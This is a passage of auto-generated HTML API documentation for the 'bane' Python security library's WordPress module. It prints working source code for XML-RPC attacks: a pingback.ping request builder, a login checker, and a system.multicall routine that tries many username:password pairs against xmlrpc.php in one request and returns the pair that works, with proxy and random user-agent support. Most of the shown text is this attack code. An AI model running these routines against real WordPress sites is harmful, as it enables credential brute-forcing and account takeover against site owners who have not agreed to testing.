&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;&#34;&#34;&#34;
        + target_url
        + &#34;&#34;&#34;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;&#34;&#34;&#34;
        + u
        + &#34;&#34;&#34;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
&#34;&#34;&#34;
    )
    try:
        r = requests.Session().post(
            url, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
    except:
        pass</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wpadmin"><code class="name flex">
<span>def <span class="ident">wpadmin</span></span>(<span>u, username, password, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wpadmin(
    u,
    username,
    password,
    user_agent=None,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False&#34;&#34;&#34;
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;&lt;methodCall&gt;
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;&#34;&#34;&#34;.format(
        username, password
    )
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if &#34;isAdmin&#34; in r.text:
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wpadmin_mass"><code class="name flex">
<span>def <span class="ident">wpadmin_mass</span></span>(<span>u, word_list=[], user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wpadmin_mass(
    u,
    word_list=[],
    user_agent=None,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False&#34;&#34;&#34;
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34;?&gt;
&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
 &#34;&#34;&#34;
    for x in word_list:
        post += &#34;&#34;&#34;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;
  &lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;
  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;
&#34;&#34;&#34;.format(
            x.split(&#34;:&#34;)[0], x.split(&#34;:&#34;)[1]
        )
    post += &#34;&#34;&#34;
&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
 &#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = (
            r.text.split(&#34;&lt;array&gt;&lt;data&gt;&#34;)[1]
            .split(&#34;&lt;/array&gt;&lt;/data&gt;&#34;)[0]
            .strip()
            .split(&#34;&lt;/struct&gt;&lt;/value&gt;&#34;)
        )
        for x in l:
            if &#34;Incorrect username or password&#34; not in x:
                return word_list[l.index(x)]
    except:
        pass
    return &#34;&#34;</code></pre>
</details>
</dd>
</dl>
</section>
<section>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.scanners.cms" href="index.html">bane.scanners.cms</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a title="bane.scanners.cms.wp.extract_with_versions" href="#bane.scanners.cms.wp.extract_with_versions">extract_with_versions</a></code></li>
<li><code><a title="bane.scanners.cms.wp.fetch_wp_exploits" href="#bane.scanners.cms.wp.fetch_wp_exploits">fetch_wp_exploits</a></code></li>
<li><code><a title="bane.scanners.cms.wp.get_wp_infos" href="#bane.scanners.cms.wp.get_wp_infos">get_wp_infos</a></code></li>
<li><code><a title="bane.scanners.cms.wp.version_string_to_list" href="#bane.scanners.cms.wp.version_string_to_list">version_string_to_list</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_user" href="#bane.scanners.cms.wp.wp_user">wp_user</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_users" href="#bane.scanners.cms.wp.wp_users">wp_users</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_users_enumeration" href="#bane.scanners.cms.wp.wp_users_enumeration">wp_users_enumeration</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_version" href="#bane.scanners.cms.wp.wp_version">wp_version</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_xmlrpc_bruteforce" href="#bane.scanners.cms.wp.wp_xmlrpc_bruteforce">wp_xmlrpc_bruteforce</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_xmlrpc_mass_bruteforce" href="#bane.scanners.cms.wp.wp_xmlrpc_mass_bruteforce">wp_xmlrpc_mass_bruteforce</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_xmlrpc_methods" href="#bane.scanners.cms.wp.wp_xmlrpc_methods">wp_xmlrpc_methods</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_xmlrpc_pingback" href="#bane.scanners.cms.wp.wp_xmlrpc_pingback">wp_xmlrpc_pingback</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wp_xmlrpc_pingback_exploit" href="#bane.scanners.cms.wp.wp_xmlrpc_pingback_exploit">wp_xmlrpc_pingback_exploit</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wpadmin" href="#bane.scanners.cms.wp.wpadmin">wpadmin</a></code></li>
<li><code><a title="bane.scanners.cms.wp.wpadmin_mass" href="#bane.scanners.cms.wp.wpadmin_mass">wpadmin_mass</a></code></li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>